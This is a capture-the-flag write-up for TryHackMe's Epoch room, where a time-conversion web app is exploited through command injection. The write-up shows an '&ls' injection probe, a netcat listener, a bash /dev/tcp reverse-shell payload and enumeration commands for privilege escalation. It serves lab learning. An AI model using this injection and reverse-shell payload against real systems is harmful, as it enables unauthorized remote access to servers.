
# Epoch — TryHackMe Writeup

**Platform:** TryHackMe  
**Room:** Epoch  
**Category:** Web / Command Injection  
**Difficulty:** Easy  

---

## What's this about?

So basically this room gives you a simple website that converts Epoch time to UTC. Looks innocent right? Yeah... it's not lol.

The goal was to find a vulnerability, get code execution on the server, and grab the flag.

---

## First Look

When I opened the app, it was just a basic input box — you type in an epoch timestamp and it spits out the UTC time. Nothing crazy.

I started poking around manually first just to understand how it works. I noticed the input was being sent as a **GET parameter** in the URL which immediately felt sus to me.

I fired up **Burp Suite** to intercept the traffic and also ran **Gobuster** to check if there were any hidden directories — nothing useful came up from that.

So I went back to the input field and started thinking... if this thing is converting time, it's probably running some kind of system command on the backend. Like maybe something like:

```bash
date -d @<your_input>
```

If that's the case and there's no sanitization, I can just inject my own commands.

---

## Finding the Vulnerability

I tested the classic command injection trick — just added `&ls` after the input:

```
1609459200&ls
```

And boom — it returned a directory listing. RCE confirmed just like that. 😄

The app was literally passing my input straight to the OS without checking anything. Classic mistake.

---

## Getting a Reverse Shell

Okay so now I know I can run commands. Next step — get a proper shell on the machine.

I set up a listener on my machine first:

```bash
nc -lvnp 8001
```

Then I injected this reverse shell payload through the input:

```bash
&/bin/bash -i >& /dev/tcp/<MY_IP>/8001 0>&1
```

It worked. Got a shell back. At this point I was like okay let's find this flag.

---

## Hunting for the Flag

Inside the shell I started doing the usual stuff to look for ways to escalate or find the flag:

```bash
# look for SUID binaries
find / -perm -4000 2>/dev/null

# check capabilities
getcap -r / 2>/dev/null

# check sudo
sudo -l
```

Nothing. And `sudo` wasn't even installed which felt weird to me at first.

Then I remembered the hint the room gives you:

> *"The developer likes to store data in environment variables."*

So I just ran:

```bash
env
```

And there it was sitting right there in the environment variables 😭

```
flag{7da6c7debd40bd611560c13d8149b647}
```

---

## Why was sudo missing?

This bugged me a bit so I looked into it. The no `sudo`, the secrets being in `env`, the stripped down environment — it all points to the app running inside a **Docker container**.

In Docker, it's actually pretty common to store secrets as environment variables. And containers usually don't have extra tools like sudo installed because they're meant to be minimal. So yeah, made sense once I thought about it.

---

## What I learned

- Always test input fields for command injection — even something as simple as `&ls` can confirm it
- When normal privesc stuff fails, check `env` — devs hide things there more than you'd think
- A missing `sudo` usually means you're inside a container
- Burp Suite is genuinely useful even for simple apps, helped me understand exactly what was being sent

---

## Tools I used

- Burp Suite
- Gobuster
- Netcat
- TryHackMe VPN

---

*Written by: Muhammad Yaseen Taha*
